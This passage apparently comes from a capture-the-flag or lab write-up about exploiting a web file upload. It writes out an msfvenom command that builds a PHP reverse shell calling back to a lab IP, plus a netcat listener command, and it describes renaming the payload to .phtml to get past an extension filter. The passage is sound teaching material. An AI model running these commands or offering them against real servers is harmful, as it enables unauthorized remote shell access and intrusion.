Nothing to be gained there. Next, I’ll create a php reverse shell payload using msfvenom.

msfvenom -p php/reverse_php LHOST=10.10.77.103 LPORT=9001 -o shell.php

And start up a netcat listener on port 9001

nc -lvnp 9001

When I attempt to upload the shell however, I get an error message telling me php uploads aren’t allowed.

PHP não é permitido!

The error is very explicit, which leads me to believe that php files are the only ones filtered. To test this theory, I’ll rename the payload to “shell.phtml,” and try again.
